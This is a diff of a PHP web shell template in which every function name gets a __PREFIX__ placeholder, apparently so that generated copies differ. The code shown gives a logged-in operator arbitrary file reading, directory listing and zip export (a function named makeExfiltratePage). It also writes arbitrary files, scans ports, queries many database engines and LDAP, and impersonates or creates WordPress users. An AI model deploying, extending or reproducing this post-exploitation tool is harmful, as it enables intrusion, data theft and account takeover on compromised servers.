@@ -140,21 +140,21 @@ $CSS = '__CSS__';
 ////////////////////////
 
 /**
- * Array column function for PHP < 5.5
+ * Array column function __PREFIX__for PHP < 5.5
  *
  * @param $array array Array to extract the column from
  * @param $column_name string Column name to extract
  *
  * @return array Extracted column
  */
-function _array_column($array, $column_name): array {
+function __PREFIX__array_column($array, $column_name): array {
     return array_map(fn($element) => $element[$column_name], $array);
 }
 
 /**
  * Check if the request method is POST
  */
-function isPost(): bool {
+function __PREFIX__isPost(): bool {
     return $_SERVER['REQUEST_METHOD'] === 'POST';
 }
 
@@ -163,7 +163,7 @@ function isPost(): bool {
  *
  * @param $name string Name of the checkbox
  */
-function isCheckboxActive($name): bool {
+function __PREFIX__isCheckboxActive($name): bool {
     return isset($_POST[$name]) && $_POST[$name] === "y";
 }
 
@@ -176,7 +176,7 @@ function isCheckboxActive($name): bool {
  * @param $current_page string Current page
  * @param $checking_page string Page to check if it's the current page
  */
-function htmlHighlightActivePage($current_page, $checking_page): string {
+function __PREFIX__htmlHighlightActivePage($current_page, $checking_page): string {
     if ($current_page === $checking_page) {
         return "bg-zinc-800 text-white";
     }
@@ -192,7 +192,7 @@ function htmlHighlightActivePage($current_page, $checking_page): string {
  *
  * @return string
  */
-function makeNavLink($page, $current_page, array $definition): string | false {
+function __PREFIX__makeNavLink($page, $current_page, array $definition): string | false {
     if ($definition["hidden"]) {
         return "";
     }
@@ -202,7 +202,7 @@ function makeNavLink($page, $current_page, array $definition): string | false {
     <li>
         <a href="?page=<?php echo $page ?>"
            class="flex gap-x-3 rounded p-2 text-sm font-semibold leading-6
-           <?php echo htmlHighlightActivePage($current_page, $page) ?>
+           <?php echo __PREFIX__htmlHighlightActivePage($current_page, $page) ?>
            "
            id="nav-<?php echo $page ?>"
         >
@@ -224,7 +224,7 @@ function makeNavLink($page, $current_page, array $definition): string | false {
  *
  * @return string
  */
-function makePageHeader($title, $description): string | false {
+function __PREFIX__makePageHeader($title, $description): string | false {
     ob_start();
     ?>
     <div class="lg:flex lg:items-center lg:justify-between">
@@ -261,7 +261,7 @@ function makePageHeader($title, $description): string | false {
  *
  * @return string
  */
-function makeInput(
+function __PREFIX__makeInput(
     $type,
     $label,
     $name,
@@ -352,7 +352,7 @@ function makeInput(
  *
  * @return string
  */
-function makeSelect($label, $name, $options, $required = false, $disable_reason = null): string | false {
+function __PREFIX__makeSelect($label, $name, $options, $required = false, $disable_reason = null): string | false {
     ob_start();
     ?>
     <div id="<?php echo $name ?>-container">
@@ -404,7 +404,14 @@ function makeSelect($label, $name, $options, $required = false, $disable_reason 
  *
  * @return string
  */
-function makeCheckbox($name, $label, $description, $is_checked = false, $value = "y", $onclick = null): string | false {
+function __PREFIX__makeCheckbox(
+    $name,
+    $label,
+    $description,
+    $is_checked = false,
+    $value = "y",
+    $onclick = null,
+): string | false {
     ob_start();
     ?>
     <div class="relative flex items-start" id="<?php echo $name ?>-container">
@@ -445,7 +452,7 @@ function makeCheckbox($name, $label, $description, $is_checked = false, $value =
  *
  * @return string
  */
-function makeForm(
+function __PREFIX__makeForm(
     $operation,
     $action,
     $elements,
@@ -481,7 +488,7 @@ function makeForm(
  *
  * @return string
  */
-function makePage($elements, $current_page): string | false {
+function __PREFIX__makePage($elements, $current_page): string | false {
     global $ENABLED_FEATURES, $CSS, $LOGIN;
     if ($_SESSION["auth"] !== true) {
         header("Location: ?page=" . $LOGIN);
@@ -509,7 +516,7 @@ function makePage($elements, $current_page): string | false {
                         <ul role="list" class="-mx-2">
                             <?php
                             foreach ($ENABLED_FEATURES as $feature => $definition) {
-                                echo makeNavLink($feature, $current_page, $definition);
+                                echo __PREFIX__makeNavLink($feature, $current_page, $definition);
                             }
                             ?>
                         </ul>
@@ -538,7 +545,7 @@ function makePage($elements, $current_page): string | false {
  *
  * @return string
  */
-function makeLoginPage(): string | false {
+function __PREFIX__makeLoginPage(): string | false {
     global $CSS, $LOGIN;
     ob_start();
     ?>
@@ -614,7 +621,7 @@ function makeLoginPage(): string | false {
  *
  * @return string
  */
-function makeCodeHighlight($code): string | false {
+function __PREFIX__makeCodeHighlight($code): string | false {
     ob_start();
     ?>
     <code class="font-mono bg-zinc-100 text-zinc-900 text-sm px-2 py-1 rounded mx-1 select-all"><?php echo $code ?></code>
@@ -630,7 +637,7 @@ function makeCodeHighlight($code): string | false {
  *
  * @return string
  */
-function makeAlert($title, $message): string | false {
+function __PREFIX__makeAlert($title, $message): string | false {
     ob_start();
     ?>
     <div class="bg-yellow-100 border-l-4 border-yellow-500 p-4 rounded mt-4 text-zinc-900 flex gap-x-4">
@@ -664,7 +671,7 @@ function makeAlert($title, $message): string | false {
  *
  * @return string
  */
-function makeTable($title, $description, $rows, $columns = null, $action_form = null): string | false {
+function __PREFIX__makeTable($title, $description, $rows, $columns = null, $action_form = null): string | false {
     $columns = $columns ?: array_keys($rows[0]);
     ob_start();
     ?>
@@ -732,10 +739,10 @@ function makeTable($title, $description, $rows, $columns = null, $action_form = 
  * @param bool $no_margin Whether to remove the margin from the command output screen
  * @param bool $no_padding Whether to remove the padding from the command output screen
  */
-function openCommandOutputScreen($classes = "",
-                                 $title = "Command output",
-                                 $no_margin = false,
-                                 $no_padding = false): void
+function __PREFIX__openCommandOutputScreen($classes = "",
+                                           $title = "Command output",
+                                           $no_margin = false,
+                                           $no_padding = false): void
 {
     ?>
 <div class="<?php
@@ -753,7 +760,7 @@ echo $no_padding ? "" : "py-10 ";
 /**
  * Closes the command output screen
  */
-function closeCommandOutputScreen(): void {
+function __PREFIX__closeCommandOutputScreen(): void {
     ?></pre>
     </div>
     </div>
@@ -766,7 +773,7 @@ function closeCommandOutputScreen(): void {
  *
  * @param array|string $data Data to output
  */
-function out($data): void {
+function __PREFIX__out($data): void {
     if (is_array($data)) {
         $data = implode("\n", $data);
     }
@@ -784,7 +791,7 @@ function out($data): void {
  * @param $filesize int Size of the file
  * @param $filename string|null Name of the file to download or null to use the original filename
  */
-function chunkedDownload($filepath, string $filesize, $filename = null): void {
+function __PREFIX__chunkedDownload($filepath, string $filesize, $filename = null): void {
     $chunk_size = 4096; // Adjust chunk size as needed
 
     header('Content-Description: File Transfer');
@@ -809,7 +816,7 @@ function chunkedDownload($filepath, string $filesize, $filename = null): void {
 /**
  * Handle the file extraction operation
  */
-function handleFileExtraction(): void {
+function __PREFIX__handleFileExtraction(): void {
     $filepath = $_POST['__PARAM_1__'];
     $preview  = strtolower($_POST['__PARAM_2__']) === "y";
     $export   = strtolower($_POST['__PARAM_3__']) === "y";
@@ -822,7 +829,7 @@ function handleFileExtraction(): void {
     $filesize = filesize($filepath);
 
     echo "Reading file '$filepath'\n";
-    echo "File size: " . formatBytes($filesize) . "\n";
+    echo "File size: " . __PREFIX__formatBytes($filesize) . "\n";
     if ($preview) {
         $preview_content = fopen($filepath, "r");
         $read            = fread($preview_content, 10240); // Read 10Kb
@@ -833,21 +840,21 @@ function handleFileExtraction(): void {
     }
 
     if ($filesize < 102400) { // Less than 100Kb
-        chunkedDownload($filepath, $filesize);
+        __PREFIX__chunkedDownload($filepath, $filesize);
     }
     elseif ($export) {
-        chunkedDownload($filepath, $filesize);
+        __PREFIX__chunkedDownload($filepath, $filesize);
     }
 }
 
 /**
  * Handle the directory listing operation
  */
-function handleDirectoryListing(): void {
+function __PREFIX__handleDirectoryListing(): void {
     $path      = $_POST['__PARAM_1__'];
     $max_depth = $_POST['__PARAM_2__'];
 
-    listFilesRecursive($path, $max_depth);
+    __PREFIX__listFilesRecursive($path, $max_depth);
 }
 
 /**
@@ -858,13 +865,13 @@ function handleDirectoryListing(): void {
  * @param $depth int Current depth
  * @param $show_line_split bool Whether to show a line split between entries
  */
-function listFilesRecursive($path, $max_depth, $depth = 0, $show_line_split = true): void {
+function __PREFIX__listFilesRecursive($path, $max_depth, $depth = 0, $show_line_split = true): void {
     if (is_string($max_depth) && strtolower($max_depth) === "inf") {
         $max_depth = INF;
     }
 
     // Get stat for current path
-    getStatForCurrentPath($path);
+    __PREFIX__getStatForCurrentPath($path);
 
     if ($show_line_split) {
         echo "----------------\n";
@@ -881,11 +888,11 @@ function listFilesRecursive($path, $max_depth, $depth = 0, $show_line_split = tr
                 $sub_path = "$path/$file";
                 // Recursively list files if depth is less than max depth
                 if ($depth < $max_depth) {
-                    listFilesRecursive($sub_path, $max_depth, $depth + 1, false);
+                    __PREFIX__listFilesRecursive($sub_path, $max_depth, $depth + 1, false);
                 }
                 else {
                     // Print information for files beyond max depth
-                    getStatForCurrentPath($sub_path);
+                    __PREFIX__getStatForCurrentPath($sub_path);
                 }
             }
         }
@@ -901,21 +908,21 @@ function listFilesRecursive($path, $max_depth, $depth = 0, $show_line_split = tr
  *
  * @return array
  */
-function getStatForCurrentPath($path) {
+function __PREFIX__getStatForCurrentPath($path) {
     $stat = stat($path);
 
     // Print information for current path
-    $perm = getPermissionsString($path);
+    $perm = __PREFIX__getPermissionsString($path);
     echo "$perm " .
-         pad_right("" . $stat["nlink"], 3) .
+         __PREFIX__pad_right("" . $stat["nlink"], 3) .
          " " .
-         pad_right("" . $stat["uid"], 5) .
+         __PREFIX__pad_right("" . $stat["uid"], 5) .
          " " .
-         pad_right("" . $stat["gid"], 5) .
+         __PREFIX__pad_right("" . $stat["gid"], 5) .
          " " .
-         formatBytes($stat["size"]) .
+         __PREFIX__formatBytes($stat["size"]) .
          " " .
-         convertUnixTimestampToDate($stat["mtime"]) .
+         __PREFIX__convertUnixTimestampToDate($stat["mtime"]) .
          " $path\n";
 
     return [$stat, $perm];
@@ -926,7 +933,7 @@ function getStatForCurrentPath($path) {
  *
  * @param $path string Path to get permissions for
  */
-function getPermissionsString($path): string {
+function __PREFIX__getPermissionsString($path): string {
     if (!file_exists($path)) {
         return "----------";
     }
@@ -968,7 +975,7 @@ function getPermissionsString($path): string {
  *
  * @return string
  */
-function pad_right($str, $pad_length = 10) {
+function __PREFIX__pad_right($str, $pad_length = 10) {
     // Ensure string and pad length are valid
     if (!is_string($str) || !is_int($pad_length) || $pad_length <= 0) {
         return $str; // Return unmodified string for invalid input
@@ -985,7 +992,7 @@ function pad_right($str, $pad_length = 10) {
  *
  * @return string
  */
-function formatBytes($bytes) {
+function __PREFIX__formatBytes($bytes) {
     $units = ['B', 'KB', 'MB', 'GB', 'TB'];
 
     $bytes = max($bytes, 0);
@@ -996,7 +1003,7 @@ function formatBytes($bytes) {
     $bytes /= 1024 ** $pow;
 
     // Format with three-point precision
-    return pad_right(round($bytes, 3) . ' ' . $units[$pow]);
+    return __PREFIX__pad_right(round($bytes, 3) . ' ' . $units[$pow]);
 }
 
 /**
@@ -1004,7 +1011,7 @@ function formatBytes($bytes) {
  *
  * @param $timestamp int Unix timestamp
  */
-function convertUnixTimestampToDate($timestamp): string {
+function __PREFIX__convertUnixTimestampToDate($timestamp): string {
     return date('Y-m-d H:i:s', $timestamp);
 }
 
@@ -1013,7 +1020,7 @@ function convertUnixTimestampToDate($timestamp): string {
  *
  * @param $paths string[] List of paths
  */
-function getShortestCommonPath($paths): ?string {
+function __PREFIX__getShortestCommonPath($paths): ?string {
     if (empty($paths)) {
         return null;
     }
@@ -1044,14 +1051,14 @@ function getShortestCommonPath($paths): ?string {
 /**
  * Handle the zip creation process
  */
-function handleCreateZip(): void {
+function __PREFIX__handleCreateZip(): void {
     $content = $_POST['__PARAM_1__'];
 
     if (!extension_loaded('zip')) {
-        echo makeExfiltratePage();
-        openCommandOutputScreen();
+        echo __PREFIX__makeExfiltratePage();
+        __PREFIX__openCommandOutputScreen();
         echo "Error: Zip extension is not loaded.\n";
-        closeCommandOutputScreen();
+        __PREFIX__closeCommandOutputScreen();
         return;
     }
 
@@ -1059,15 +1066,15 @@ function handleCreateZip(): void {
     $zip_name = tempnam(sys_get_temp_dir(), "__RANDOM_5_STRING__");
 
     if ($zip->open($zip_name, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== true) {
-        echo makeExfiltratePage();
-        openCommandOutputScreen();
+        echo __PREFIX__makeExfiltratePage();
+        __PREFIX__openCommandOutputScreen();
         echo "Error: Could not create temporary archive.\n";
-        closeCommandOutputScreen();
+        __PREFIX__closeCommandOutputScreen();
         return;
     }
 
     $lines            = explode("\n", $content);
-    $path_replacement = getShortestCommonPath($lines);
+    $path_replacement = __PREFIX__getShortestCommonPath($lines);
     foreach ($lines as $line) {
         $parts = explode(',', trim($line)); // Split line by comma
         $path  = $parts[0] ?? '';
@@ -1102,7 +1109,13 @@ function handleCreateZip(): void {
             }
             else {
                 if (is_dir($path) && is_readable($path)) {
-                    addDirectoryToZip($path, $zip, $recursive, $extensions, $path_replacement . DIRECTORY_SEPARATOR);
+                    __PREFIX__addDirectoryToZip(
+                        $path,
+                        $zip,
+                        $recursive,
+                        $extensions,
+                        $path_replacement . DIRECTORY_SEPARATOR,
+                    );
                 }
             }
         }
@@ -1111,7 +1124,7 @@ function handleCreateZip(): void {
     $zip->close();
 
     $file_size = filesize($zip_name);
-    chunkedDownload($zip_name, $file_size, "export.zip");
+    __PREFIX__chunkedDownload($zip_name, $file_size, "export.zip");
     unlink($zip_name); // Delete temporary zip file;
 }
 
@@ -1124,7 +1137,7 @@ function handleCreateZip(): void {
  * @param $extensions string[] Extensions to include
  * @param $cleanup_path string Path to cleanup
  */
-function addDirectoryToZip($dir, $zip, $recursive, $extensions, $cleanup_path = ""): void {
+function __PREFIX__addDirectoryToZip($dir, $zip, $recursive, $extensions, $cleanup_path = ""): void {
     $dir_handle = opendir($dir);
 
     while (($file = readdir($dir_handle)) !== false) {
@@ -1150,7 +1163,7 @@ function addDirectoryToZip($dir, $zip, $recursive, $extensions, $cleanup_path = 
             }
             else {
                 if ($recursive && is_dir($sub_path) && is_readable($sub_path)) {
-                    addDirectoryToZip($sub_path, $zip, $recursive, $extensions, $cleanup_path);
+                    __PREFIX__addDirectoryToZip($sub_path, $zip, $recursive, $extensions, $cleanup_path);
                 }
             }
         }
@@ -1162,12 +1175,12 @@ function addDirectoryToZip($dir, $zip, $recursive, $extensions, $cleanup_path = 
 /**
  * Handle the port scan operation
  */
-function handlePortScan(): void {
+function __PREFIX__handlePortScan(): void {
     $host      = $_POST['__PARAM_1__'];
     $startPort = intval($_POST['__PARAM_2__']);
     $endPort   = intval($_POST['__PARAM_3__']);
 
-    out("Scanning ports $startPort to $endPort on $host...");
+    __PREFIX__out("Scanning ports $startPort to $endPort on $host...");
 
     // Loop through the port range
     for ($port = $startPort; $port <= $endPort; $port++) {
@@ -1178,11 +1191,11 @@ function handlePortScan(): void {
         if ($socket) {
             // The port is open
             fclose($socket);
-            out("Port $port: OPEN");
+            __PREFIX__out("Port $port: OPEN");
         }
         else {
             // The port is closed or unreachable
-            out("Port $port: CLOSED / UNREACHABLE (err: $errstr)");
+            __PREFIX__out("Port $port: CLOSED / UNREACHABLE (err: $errstr)");
         }
         flush();
     }
@@ -1191,23 +1204,23 @@ function handlePortScan(): void {
 /**
  * Handle the write file operation
  */
-function handleWriteFile(): void {
+function __PREFIX__handleWriteFile(): void {
     $filename               = $_POST['__PARAM_1__'];
-    $should_decode_from_b64 = isCheckboxActive("__PARAM_3__");
+    $should_decode_from_b64 = __PREFIX__isCheckboxActive("__PARAM_3__");
     $content                = $should_decode_from_b64 ? base64_decode($_POST['__PARAM_2__']) : $_POST['__PARAM_2__'];
 
-    out(
+    __PREFIX__out(
         ["Received content of length " . strlen($content) . " bytes.", "Writing to $filename ..."],
     );
 
     file_put_contents($filename, $content);
-    out("File written successfully.");
+    __PREFIX__out("File written successfully.");
 }
 
 /**
  * Handle the login operation
  */
-function handleLogin(): void {
+function __PREFIX__handleLogin(): void {
     global $SALT, $PASSWORD, $USERNAME, $FILE_EXTRACTION;
     $username = hash("sha512", $_POST["__PARAM_1__"] . $SALT);
     $password = hash("sha512", $_POST["__PARAM_2__"] . $SALT);
@@ -1223,27 +1236,27 @@ function handleLogin(): void {
  *
  * @return string
  */
-function makeExfiltratePage() {
+function __PREFIX__makeExfiltratePage() {
     global $EXFILTRATE, $ENABLED_FEATURES;
-    return makePage(
+    return __PREFIX__makePage(
         [
-            makePageHeader(
+            __PREFIX__makePageHeader(
                 $ENABLED_FEATURES[$EXFILTRATE]["title"],
                 $ENABLED_FEATURES[$EXFILTRATE]["description"],
             ),
-            makeForm(
+            __PREFIX__makeForm(
                 $EXFILTRATE,
                 $_SERVER["REQUEST_URI"],
                 [
-                    makeInput(
+                    __PREFIX__makeInput(
                         "textarea",
                         "Paths",
                         "__PARAM_1__",
                         "C://path/to/file1.txt\nC://path/to/file2.txt\nC://path/to/folder1\nC://path/to/folder2,with_tree\nC://path/to/folder3,with_tree,extensions=txt|doc|xlsx",
                         "List of file/folders to include in the zip archive.<br/>" .
-                        "Concatenate to the path " . makeCodeHighlight(",with_tree") .
+                        "Concatenate to the path " . __PREFIX__makeCodeHighlight(",with_tree") .
                         " to include all files and folders within a given directory.<br/>" .
-                        "Concatenate to the path " . makeCodeHighlight(",extensions=txt|doc|xlsx") .
+                        "Concatenate to the path " . __PREFIX__makeCodeHighlight(",extensions=txt|doc|xlsx") .
                         " to include only files with the given extensions.",
                         true,
                     ),
@@ -1259,14 +1272,14 @@ function makeExfiltratePage() {
  *
  * @return string
  */
-function listEnabledExtensions(): string | false {
+function __PREFIX__listEnabledExtensions(): string | false {
     $extensions = get_loaded_extensions();
     ob_start();
-    openCommandOutputScreen("max-h-96 overflow-y-scroll mb-8", "Enabled extensions", true, true);
+    __PREFIX__openCommandOutputScreen("max-h-96 overflow-y-scroll mb-8", "Enabled extensions", true, true);
     foreach ($extensions as $extension) {
         echo "- $extension\n";
     }
-    closeCommandOutputScreen();
+    __PREFIX__closeCommandOutputScreen();
     return ob_get_clean();
 }
 
@@ -1276,13 +1289,13 @@ function listEnabledExtensions(): string | false {
  * @param $pdo PDO PDO connection to use
  * @param $query string Query to run
  */
-function runPDOQuery($pdo, $query): void {
+function __PREFIX__runPDOQuery($pdo, $query): void {
     $stmt = $pdo->query($query);
     if ($stmt) {
         $result = $stmt->fetchAll(PDO::FETCH_ASSOC);
         if ($result) {
             echo "[Driver: PDO] Query executed successfully.\n";
-            printAsciiTable($result);
+            __PREFIX__printAsciiTable($result);
         }
         else {
             echo "[Driver: PDO] Query failed: " . json_encode($pdo->errorInfo()) . "\n";
@@ -1298,14 +1311,14 @@ function runPDOQuery($pdo, $query): void {
  *
  * @param $data array[] Data to print
  */
-function printAsciiTable($data): void {
+function __PREFIX__printAsciiTable($data): void {
     // Get column headers
     $headers = array_keys($data[0]);
 
     // Calculate column widths
     $columnWidths = [];
     foreach ($headers as $header) {
-        $columnWidths[$header] = max(array_map('strlen', _array_column($data, $header))) + 2;
+        $columnWidths[$header] = max(array_map('strlen', __PREFIX__array_column($data, $header))) + 2;
     }
 
     // Print top row
@@ -1372,7 +1385,7 @@ function printAsciiTable($data): void {
  * @param $query string|null Query to run
  * @param $collection string|null Collection to use for connection
  */
-function connectAndQueryDatabase(
+function __PREFIX__connectAndQueryDatabase(
     $db_type,
     $username,
     $password,
@@ -1416,7 +1429,7 @@ function connectAndQueryDatabase(
                             while ($row = mysqli_fetch_assoc($result)) {
                                 $rows[] = $row;
                             }
-                            printAsciiTable($rows);
+                            __PREFIX__printAsciiTable($rows);
                         }
                         else {
                             echo "[Driver: mysql] Query failed: " . mysqli_error($connection);
@@ -1439,7 +1452,7 @@ function connectAndQueryDatabase(
                 echo "[Driver: pdo_mysql] Connected successfully using $username:$password.\n";
 
                 if (!empty($query)) {
-                    runPDOQuery($pdo, $query);
+                    __PREFIX__runPDOQuery($pdo, $query);
                 }
             }
             catch (PDOException $e) {
@@ -1468,7 +1481,7 @@ function connectAndQueryDatabase(
                 echo "[Driver: pdo_cubrid] Connected successfully using $username:$password.\n";
 
                 if (!empty($query)) {
-                    runPDOQuery($pdo, $query);
+                    __PREFIX__runPDOQuery($pdo, $query);
                 }
             }
             catch (PDOException $e) {
@@ -1493,7 +1506,7 @@ function connectAndQueryDatabase(
                         while ($row = cubrid_fetch_assoc($result)) {
                             $rows[] = $row;
                         }
-                        printAsciiTable($rows);
+                        __PREFIX__printAsciiTable($rows);
                     }
                     else {
                         echo "[Driver: cubrid] Query failed: " . cubrid_error($connection);
@@ -1517,7 +1530,7 @@ function connectAndQueryDatabase(
                 echo "[Driver: pdo_pgsql] Connected successfully using $username:$password.\n";
 
                 if (!empty($query)) {
-                    runPDOQuery($pdo, $query);
+                    __PREFIX__runPDOQuery($pdo, $query);
                 }
             }
             catch (PDOException $e) {
@@ -1542,7 +1555,7 @@ function connectAndQueryDatabase(
                         while ($row = pg_fetch_assoc($result)) {
                             $rows[] = $row;
                         }
-                        printAsciiTable($rows);
+                        __PREFIX__printAsciiTable($rows);
                     }
                     else {
                         echo "[Driver: pgsql] Query failed: " . pg_last_error($connection);
@@ -1564,7 +1577,7 @@ function connectAndQueryDatabase(
                 echo "[Driver: pdo_sqlite] Connected successfully using $host.\n";
 
                 if (!empty($query)) {
-                    runPDOQuery($pdo, $query);
+                    __PREFIX__runPDOQuery($pdo, $query);
                 }
             }
             catch (PDOException $e) {
@@ -1589,7 +1602,7 @@ function connectAndQueryDatabase(
                         while ($row = sqlite_fetch_array($result)) {
                             $rows[] = $row;
                         }
-                        printAsciiTable($rows);
+                        __PREFIX__printAsciiTable($rows);
                     }
                     else {
                         echo "[Driver: sqlite3] Query failed: " . sqlite_error_string(sqlite_last_error($connection));
@@ -1613,7 +1626,7 @@ function connectAndQueryDatabase(
                 echo "[Driver: pdo_sqlsrv] Connected successfully using $username:$password.\n";
 
                 if (!empty($query)) {
-                    runPDOQuery($pdo, $query);
+                    __PREFIX__runPDOQuery($pdo, $query);
                 }
             }
             catch (PDOException $e) {
@@ -1653,7 +1666,7 @@ function connectAndQueryDatabase(
                     while ($row = sqlsrv_fetch_array($result, SQLSRV_FETCH_ASSOC)) {
                         $rows[] = $row;
                     }
-                    printAsciiTable($rows);
+                    __PREFIX__printAsciiTable($rows);
                 }
                 else {
                     echo "[Driver: sqlsrv] Query failed: " . sqlsrv_errors();
@@ -1682,7 +1695,7 @@ function connectAndQueryDatabase(
                 echo "[Driver: pdo_oci] Connected successfully using $username:$password.\n";
 
                 if (!empty($query)) {
-                    runPDOQuery($pdo, $query);
+                    __PREFIX__runPDOQuery($pdo, $query);
                 }
             }
             catch (PDOException $e) {
@@ -1708,7 +1721,7 @@ function connectAndQueryDatabase(
                             while ($row = oci_fetch_assoc($statement)) {
                                 $rows[] = $row;
                             }
-                            printAsciiTable($rows);
+                            __PREFIX__printAsciiTable($rows);
                         }
                         else {
                             echo "[Driver: oci8] Query failed: " . oci_error($statement);
@@ -1742,7 +1755,7 @@ function connectAndQueryDatabase(
                     foreach ($cursor as $row) {
                         $rows[] = $row;
                     }
-                    printAsciiTable($rows);
+                    __PREFIX__printAsciiTable($rows);
                 }
             }
             catch (MongoDB\Driver\Exception\Exception $e) {
@@ -1763,7 +1776,7 @@ function connectAndQueryDatabase(
                     foreach ($cursor as $row) {
                         $rows[] = $row;
                     }
-                    printAsciiTable($rows);
+                    __PREFIX__printAsciiTable($rows);
                 }
             }
             catch (MongoConnectionException | Exception $e) {
@@ -1785,7 +1798,7 @@ function connectAndQueryDatabase(
                 echo "[Driver: pdo_ibm] Connected successfully using $username:$password.\n";
 
                 if (!empty($query)) {
-                    runPDOQuery($pdo, $query);
+                    __PREFIX__runPDOQuery($pdo, $query);
                 }
             }
             catch (PDOException $e) {
@@ -1810,7 +1823,7 @@ function connectAndQueryDatabase(
                         while ($row = db2_fetch_assoc($result)) {
                             $rows[] = $row;
                         }
-                        printAsciiTable($rows);
+                        __PREFIX__printAsciiTable($rows);
                     }
                     else {
                         echo "[Driver: ibm] Query failed: " . db2_conn_error();
@@ -1836,7 +1849,7 @@ function connectAndQueryDatabase(
                 echo "[Driver: pdo_firebird] Connected successfully using $username:$password.\n";
 
                 if (!empty($query)) {
-                    runPDOQuery($pdo, $query);
+                    __PREFIX__runPDOQuery($pdo, $query);
                 }
             }
             catch (PDOException $e) {
@@ -1883,7 +1896,7 @@ function connectAndQueryDatabase(
                     while ($row = ibase_fetch_assoc($result)) {
                         $rows[] = $row;
                     }
-                    printAsciiTable($rows);
+                    __PREFIX__printAsciiTable($rows);
                 }
                 else {
                     echo "[Driver: interbase] Query failed: " . ibase_errmsg();
@@ -1904,7 +1917,7 @@ function connectAndQueryDatabase(
                 echo "[Driver: pdo_odbc] Connected successfully using $username:$password.\n";
 
                 if (!empty($query)) {
-                    runPDOQuery($pdo, $query);
+                    __PREFIX__runPDOQuery($pdo, $query);
                 }
             }
             catch (PDOException $e) {
@@ -1929,7 +1942,7 @@ function connectAndQueryDatabase(
                         while ($row = odbc_fetch_array($result)) {
                             $rows[] = $row;
                         }
-                        printAsciiTable($rows);
+                        __PREFIX__printAsciiTable($rows);
                     }
                     else {
                         echo "[Driver: odbc] Query failed: " . odbc_errormsg();
@@ -1952,7 +1965,7 @@ function connectAndQueryDatabase(
                 echo "[Driver: pdo_informix] Connected successfully using $username:$password.\n";
 
                 if (!empty($query)) {
-                    runPDOQuery($pdo, $query);
+                    __PREFIX__runPDOQuery($pdo, $query);
                 }
             }
             catch (PDOException $e) {
@@ -1974,7 +1987,7 @@ function connectAndQueryDatabase(
                 echo "[Driver: pdo_dblib] Connected successfully using $username:$password.\n";
 
                 if (!empty($query)) {
-                    runPDOQuery($pdo, $query);
+                    __PREFIX__runPDOQuery($pdo, $query);
                 }
             }
             catch (PDOException $e) {
@@ -1995,7 +2008,7 @@ function connectAndQueryDatabase(
                 echo "[Driver: PDO] Connected successfully using $username:$password.\n";
 
                 if (!empty($query)) {
-                    runPDOQuery($pdo, $query);
+                    __PREFIX__runPDOQuery($pdo, $query);
                 }
             }
             catch (PDOException $e) {
@@ -2014,8 +2027,8 @@ function connectAndQueryDatabase(
 /**
  * Handle the query database operation
  */
-function handleQueryDatabase(): void {
-    connectAndQueryDatabase(
+function __PREFIX__handleQueryDatabase(): void {
+    __PREFIX__connectAndQueryDatabase(
         $_POST["__PARAM_1__"],
         $_POST["__PARAM_4__"],
         $_POST["__PARAM_5__"],
@@ -2046,7 +2059,7 @@ function handleQueryDatabase(): void {
  * @param $domain string LDAP domain
  * @param $query string LDAP query
  */
-function runLDAPQuery($server, $port, $username, $password, $domain, $query): void {
+function __PREFIX__runLDAPQuery($server, $port, $username, $password, $domain, $query): void {
     $port = $port ?: 389;
 
     // Connect to LDAP server
@@ -2112,7 +2125,7 @@ function runLDAPQuery($server, $port, $username, $password, $domain, $query): vo
  *
  * @return array List of WordPress users
  */
-function getWPUsers(): array {
+function __PREFIX__getWPUsers(): array {
     return array_map(
         function ($data): array {
             global $IMPERSONATE_WP_USER;
@@ -2120,11 +2133,11 @@ function getWPUsers(): array {
                 (array) $data->data,
                 [
                     "roles"   => $data->roles,
-                    "actions" => makeForm(
+                    "actions" => __PREFIX__makeForm(
                         $IMPERSONATE_WP_USER,
                         $_SERVER["REQUEST_URI"],
                         [
-                            makeInput(
+                            __PREFIX__makeInput(
                                 "hidden",
                                 "__PARAM_1__",
                                 "username",
@@ -2149,9 +2162,9 @@ function getWPUsers(): array {
 /**
  * Handle the impersonate WordPress user operation and user creation operation
  */
-function handleImpersonateWPUser(): void {
+function __PREFIX__handleImpersonateWPUser(): void {
     // Run the impersonate operation
-    if (isset($_POST["__PARAM_1__"]) && !empty($_POST["__PARAM_1__"])) {
+    if (!empty($_POST["__PARAM_1__"])) {
         $user = get_user_by("login", $_POST["__PARAM_1__"]);
         if ($user) {
             wp_set_current_user($user->ID, $user->user_login);
@@ -2161,9 +2174,7 @@ function handleImpersonateWPUser(): void {
         }
     }
     // Run the user creation operation
-    elseif (isset($_POST["__PARAM_2__"]) &&
-            !empty($_POST["__PARAM_2__"]) &&
-            isset($_POST["__PARAM_3__"]) &&
+    elseif (!empty($_POST["__PARAM_2__"]) &&
             !empty($_POST["__PARAM_3__"])) {
         $user_id = wp_insert_user(
             [
@@ -2197,28 +2208,28 @@ if (isset($_GET["dev"])) {
 $isolated_ops = [$FILE_EXTRACTION, $EXFILTRATE, $LOGIN, $IMPERSONATE_WP_USER];
 
 // Check if the request is not POST and the operation is not in the isolated operations list, then render the page
-if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"], $isolated_ops))) {
+if (!__PREFIX__isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"], $isolated_ops))) {
     $page = $_GET['page'] ?? ($_SESSION["auth"] === true ? $FILE_EXTRACTION : $LOGIN);
 
     $content = "";
 
     switch ($page) {
         case $LOGIN:
-            $content = makeLoginPage();
+            $content = __PREFIX__makeLoginPage();
             break;
         case $FILE_EXTRACTION_PREVIEW:
         case $FILE_EXTRACTION:
-            $content = makePage(
+            $content = __PREFIX__makePage(
                 [
-                    makePageHeader(
+                    __PREFIX__makePageHeader(
                         $ENABLED_FEATURES[$page]["title"],
                         $ENABLED_FEATURES[$page]["description"],
                     ),
-                    makeForm(
+                    __PREFIX__makeForm(
                         $page,
                         $_SERVER["REQUEST_URI"],
                         [
-                            makeInput(
+                            __PREFIX__makeInput(
                                 "text",
                                 "Path",
                                 "__PARAM_1__",
@@ -2227,7 +2238,7 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
                                 true,
                                 "__PARAM_99__",
                             ),
-                            makeCheckbox(
+                            __PREFIX__makeCheckbox(
                                 "__PARAM_2__",
                                 "Preview",
                                 "Display preview of the file content if it's larger than 100kb.",
@@ -2241,7 +2252,7 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
                                       $FILE_EXTRACTION_PREVIEW .
